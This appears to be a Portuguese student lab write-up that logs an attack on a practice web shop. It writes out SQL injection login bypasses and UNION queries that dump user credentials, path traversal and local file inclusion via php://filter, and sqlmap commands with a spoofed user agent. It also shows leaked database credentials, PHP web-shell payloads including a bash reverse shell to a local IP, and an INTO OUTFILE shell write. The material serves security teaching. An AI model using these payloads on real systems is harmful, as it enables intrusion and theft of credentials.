Inicialmente começou-se por percorrer todas as páginas do site, tomando especial atenção ao login, onde se tentaram injeções de sql básicas, tanto no email como na password, sem chegar a nenhuma conclusão. Estas tentativas foram baseadas nas approaches de sql injection da aula prática 1, portanto: 

email: ' or '1'='1' -- 
password: abc

email: ' or 1 -- 
password: abc

username: ' or '1'='1' -- // 
email: abc

E tudo falhava porque o campo do email pedia para introduzir um email válido. 
Tentou-se então sql injection de outra maneira, pesquisando sobre como introduzir algo no email que o SQL aceitasse como email, embora não o fosse.
src: https://stackoverflow.com/questions/2923594/valid-email-addresses-xss-and-sql-injection

email: "'OR 1=1--"@gmail.com
password: abc

Novamente sem sucesso, tentou-se colocar regex no campo do email, que corresponde-se a um formato genérico de email

email: [a-z0-9.-_+]@[a-z0-9.-].com
password: abc

Não chegando a qualquer resultado palpável, continuou-se a explorar o site, onde se começou a descobrir pormenores mais interessantes:  
1.  A partir do url das páginas Board e Software, notou-se uma possibilidade de conseguir fazer sql injection, uma vez que tinha '?type=1' ou '?prod=3&type=1', por exemplo. 
	Assim sendo, começou-se a tentar injeções, novamente com base na aula prática 1.
	Inicialmente fizemos várias tentativas para descobrir quantas colunas eram retornadas pelos queries feitos às bases de dados. Sabíamos que havia pelo menos 5 (name, price, type, details e id). 
	
	<ip>/details.php?<script>alert("eheh")</script>prod=3&type=3	
		" DB Error, could not query the database MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1" 
		A partir deste resultado ficamos a saber qual o SGDB usado para sustentar os dados do site. 
	
	<ip>/products.php?type=1 union select 1,2,3,4,5 -- 
		Apareceu mais um produto no fim da lista, cujo nome era 3, o que nos fez suspeitar que a 3º coluna retornada pelos queries à base de dados era colocada no atributo name do produto. Assim, achámos que a melhor forma de fazer sql injection nesta página seria a partir da 3 coluna, o que é explorado abaixo. 
		Clicando no produto não se chegou a conclusão nenhuma.
		
	<ip>/products.php?type=1 union select 1,2,3,4,5,6 -- 
		Este url já nos redireciona para a home, pelo que se concluiu que eram só 5 colunas. 
		
	<ip>/products.php?type=1 union select 1,database(),3,4,5 -- 
		Com isto apareceu mais um produto cujo nome era 3. Clicando nesse mesmo e observando o url, apercebemo-nos de que o type correspondia a 'oldstore' -> nome da base de dados.
		
	<ip>/products.php?type=1 union select 1, table_name, column_name, table_schema, 5 from information_schema.columns -- 	
		Percorrendo a página inteira, encontrou-se no fundo os nomes de algumas tabelas que se pensou serem interessantes explorar: 
		
		<ip>/products.php?type=1 union select 1,2,COLUMN_NAME,4,5 from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME="tblProducts"
			Devolve o nome de todos os produtos disponíveis, a partir da qual é possível fazer coisas do tipo:
		
			<ip>/products.php?type=1 union select 1,2, id,4,5 from tblProducts -- 
				Verificar todos os ids dos produtos existentes na base de dados.
			
			<ip>/products.php?type=1 union select 1,2, title,4,5 from tblBlogs --
				Verificar os títulos dos blogs existentes na base de dados.
				
			Mas mais interessante:
			<ip>/products.php?type=2 union select 1, 2, id, 4, 5 from tblMembers
			<ip>/products.php?type=2 union select 1, 2, username, 4, 5 from tblMembers
			<ip>/products.php?type=2 union select 1, 2, password, 4, 5 from tblMembers
			<ip>/products.php?type=2 union select 1, 2, session, 4, 5 from tblMembers
			<ip>/products.php?type=2 union select 1, 2, name, 4, 5 from tblMembers
			<ip>/products.php?type=2 union select 1, 2, blog, 4, 5 from tblMembers
			<ip>/products.php?type=2 union select 1, 2, admin, 4, 5 from tblMembers
				Temos então agora acesso ao mail do admin, à sua password, sessão, nome, entre outros.

			Tabelas importantes:
			tblBlogs (author, title, content)
			tblMembers (id, username, password, session, name, blog, admin)
			tblProducts (id, type, name, price, detail)
			
			conteúdo da tabela tblMembers:
			1	admin@integratingsolutions.net	Administrator	354403ec41ad649d1e5a9f108f0e5245	Admin	1	1
	
Podemos então entrar, agora, na conta do admin.
email: admin@integratingsolutions.net
password: Administrator

Nota: tínhamos já obtido o email previamente através da página blogs, porque clicando em 'by Admin' era possível ver qual o email associado ao mesmo. 

O próximo passo foi atacar novamente o login, tentando injeção já com o email.
email: admin@integratingsolutions.net
password: "' or 1 = 1 -- 
		  (ou outra equivalente, como: "' or 1 = 1 -- )
		  
Já na conta do admin, podendo postar novos blogs, testaram-se novas maneiras de fazer sql injection e xss:
<script>{console.log(“ola”)}</script> 
	Resultando numa mensagem na consola: GET http://192.168.1.7/ola
<img src="https://shifter.sapo.pt/wp-content/uploads/2018/03/rickrolled.png">
	Embora não se possa colocar uma imagem no titulo, o conteúdo não é filtrado no sentido em que não verifica de onde vem a informação e posta tudo o que lhe é fornecido. 
<script>alert("eheh")</script>
<div><p>"something"</p></div>
<? php echo 'hello' ?>


Continuando com a exploração da página em si, suscitaram-nos a atenção dois pormenores:
1. Aquando na página dos termos e condições (que também contém o email do admin), seria de esperar que clicar quer em GBP, EUR ou USD no rodapé da página fizesse algo, o que não aconteu, embora o atributo lang aparecesse no url. Isto será explorado mais à frente. 

2. Querendo saber o que o portfolio fazia para iniciar o download, fizemos hover sobre o mesmo e obtivemos o seguinte url:
	<ip>/download.php?item=Brochure.pdf
	Explorado também mais à frente. 
	
	
	
Analizar os resultados do nmap:
	#TODO
Analizar os resultados do nikto2:
	#TODO
Analizar os resultados do sqlmap:
	#TODO
	sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="level=1" -u '<ip>/products.php?type=1' --dbs
	sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="level=1" -u '<ip>/products.php?type=1' --privileges
	sqlmap --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" -u http://192.168.1.7/products.php?type=1  --file-write teste.php --file-dest /etc (não deu porque o DBMS process user não tem direitos sobre o diretório destino, o que foi confirmado pelo comando acima que disse que só tinha access rights)  
 
Analizar os resultados do dirb: ($ dirb http://192.168.0.49/)
	==> DIRECTORY: <ip>/admin/                                                           
	==> DIRECTORY: <ip>/downloads/                                                       
	==> DIRECTORY: <ip>/images/ 
	<ip>/theme/
	
	Explorando todos estes urls, os mais importantes são /admin & /downloads.
		/downloads:
			ficheiro login.php.txt que nos revela como é processado o login na página e nos fez entender que a verificação do email não era feita a partir de sql, bem como que algures existe um ficheiro chamado 'connection.php'
		
		/admin:
			se nos encontrarmos na conta do administrador e entrarmos em <ip>/admin/admin.php temos acesso a um site que é disponibilizado ao admin para adicionar e remover algo (ficheiros addproduct.php e delproduct.php) 
			e mais 3 ficheiros .php
			
Voltando um passo atrás e vendo como se processava o download do Brochure.pdf, testou-se o seguinte:
<ip>/download.php?item=connection.php

O que não resultou em nada.. Mas não deu erro, podemos simplesmente estar a ir buscar ao diretório errado, portanto tentou-se:
PATH TRAVERSAL
<ip>/download.php?item=../connection.php

Temos assim acesso a todos os ficheiros .php
Conjunto de ficheiros .php que encontrámos e conseguimos descarregar:
1.  about.php
2.  aboutcontent.php
3.  account.php
4.  blog.php
5.  blog-content.php
6.  config.php
7.  connection.php
8.  connectioni.php
9.  display.php
10. footer.php
11. front.php
12. header.php
13. index.php
14. info.php
15. products.php
16. user-details.php
17. download.php
18. getfile.php
19. login.php
20. logout.php
21. postblog.php
22. terms.php
23. updateaccount.php
24. admin.php
25. admincontent.php
26. adminheader.php
27. adminnav.php

Ficheiros .php que possivelmente existem: 
1. delproduct.php
2. addproduct.php


Informações que mais saltaram à vista ao analizar os ficheiros .php:
	connection.php
		if (!$link = mysql_connect($host, $user, $pass)) {
		echo 'Could not connect to mysql';
		exit;
		}	
	
			informação sobre o que necessitamos para entrar na base de dados 
	
	
	config.php
		$host = 'localhost';
		$user = 'root';
		$pass = '1ll-b3-b4ck';
		$database = 'oldstore';
		
			dados para entrar na DB
	
	
	display.php
	    if (mysql_num_rows($result) > 0) {
        if (isset($_GET['lang'])) {
            $lang = $_GET['lang'];
        }
        elseif (isset($_COOKIE['lang'])) {
            $lang = $_COOKIE['lang'];
        } else {
            $lang = 'GBP';
        }

        include $lang;
        
        
		    ! isto é muito importante porque finalmente entendemos para o que serve o lang, vai ser o valor da cookie. 
		    futhermore, e se não mais importante, há um include da variável $lang no ficheiro, isto abre possibilidades sobre como injetar php e aceder a outro tipo de informações
        
        
	header.php
		<?php
		include 'nav.php';
		?>
		
		
		if (!isset($_COOKIE['level'])) {
    	setcookie("level", "1");
		}	
		
		
		if (strpos($_SERVER['HTTP_USER_AGENT'], "sqlmap") !== false ||
		strpos($_SERVER['HTTP_USER_AGENT'], "Havij") !== false ||
		strpos($_SERVER['HTTP_USER_AGENT'], "Nikto") !== false ||
		strpos($_SERVER['HTTP_USER_AGENT'], "requests") !== false ||
		strpos($_SERVER['HTTP_USER_AGENT'], "ZAP") !== false ||
		strpos($_SERVER['HTTP_USER_AGENT'], "Burp") !== false ||
		strpos($_SERVER['HTTP_USER_AGENT'], "Metasploit") !== false ||
		strpos($_SERVER['HTTP_USER_AGENT'], "Gecko/20060418 Firefox/1.0.8") !== false) {
			exit;
		}
		
		
			outro include, pode ser interessante
			outra utilização de cookie
			motivo pelo qual sqlmap e nikto não darão informação nenhuma, bem como qualquer outro user_agent listado
			
	
	info.php
		Server Root 	/etc/apache2 
		DOCUMENT_ROOT 	/var/www/html 
		_SERVER["SERVER_ADMIN"]	webmaster@localhost
		_SERVER["HTTP_ACCEPT"]	text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
		APACHE_LOG_DIR 	/var/log/apache2 


Com base no DOCUMENT_ROOT, começámos a tentar acessos à root:
#TODO - explicar o porquê de termos tentado fazer isto.. aceder à root através de php injection, queriamos primeiro testar o terreno 

	<ip>/download.php?item=../../../../../../../../var/www/html/index.php
                           ../../../../../../../../var/www/html/config.php
                           
    /products.php?type=1&lang=../../../../../../etc/timezone                        
	&lang=../../../../../../../../etc/httpd/logs/access_log
								 /etc/timezone
								 /etc/httpd/logs/access_log
								 /var/log/apache2/error.log
								 /var/log/apache2/access.log
								 /var/log/httpd/access.log
								 /var/log/httpd/access_log
								 /var/log/mysqld.log
								 /var/log/httpd/error_log
								 ________________________________________
							 	 php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/httpd/logs/access_log
							 	 php://filter/read=convert.base64-encode/resource=connection.php
								 php://filter/read=convert.base64-encode/resource=../../../../../../../../etc/httpd/logs/access.log	
								 <? php echo "hello" ?>
								 <? php echo "Hello World";
								 <?php
							 		 alert("Hello World");
									 function alert($msg) { echo "<script type='text/javascript'>alert('$msg');</script>"; }
		  						 ?>
								 <? php alert("Hello World"); function alert($msg) { echo "<script type='text/javascript'>alert('$msg');</script>"; } ?>
	      						 <? php echo shell_exec(‘ls -lart’); ?>
	      						 <?php exec('whoami') ?>
								 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/8888 0>&1'");
	
	1 union SELECT 1,2,3,“<?php shell_exec('ls); ?>”,5 INTO OUTFILE “../../../../../../var/www/html/ls.php”
	1 union SELECT 1,LOAD_FILE(“../../../../../../var/www/html/ls.php”),3,4,5
	1 union SELECT 1,2,“<?php echo("ola"); ?>”,4,5
		como em display tem while ($row = mysql_fetch_assoc($result)), não será possível fazer display do echo porque não há nenhum nome na bd que corresponda a isso

